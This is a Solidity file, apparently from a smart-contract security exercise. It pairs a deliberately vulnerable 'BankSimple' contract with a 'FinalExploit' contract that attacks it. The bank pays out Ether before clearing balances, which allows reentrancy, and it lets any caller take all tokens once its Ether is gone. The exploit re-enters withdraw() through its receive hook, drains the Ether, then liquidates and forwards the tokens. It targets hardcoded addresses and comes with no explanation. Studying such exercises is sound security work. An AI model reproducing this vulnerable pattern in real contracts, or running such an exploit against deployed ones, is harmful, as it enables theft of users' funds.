// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BankSimple {
    mapping(address => uint) public balances;

    function deposit(address token, uint256 amount) public payable {
        balances[msg.sender] += msg.value;
        IERC20(token).transferFrom(msg.sender, address(this), amount);
    }


    // 1. deposit
    // 2. withdraw

    function withdraw() public {
        uint bal = balances[msg.sender]; // 0.5
        // bal = 0.5
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function liquidate(address token) public {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (address(this).balance == 0) {
            IERC20(token).transfer(msg.sender, balance);
        }
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract FinalExploit {
    constructor() { }

    address internal HAK = address(0xBefeeD4CB8c6DD190793b1c97B72B60272f3EA6C);

    BankSimple internal bank
        = BankSimple(0x0A5F137ea5f0103c5f08320A6256820cEdefa1ea);
    bool internal done;

    receive() external payable {
        if (!done) {
            done = true;
            bank.withdraw();
        }
    }

    function run() external payable {
        bank.deposit{ value: msg.value }(HAK, 0);
        bank.withdraw();
        bank.liquidate(HAK);
        IERC20(HAK).transfer(msg.sender, IERC20(HAK).balanceOf(address(this)));
    }
}
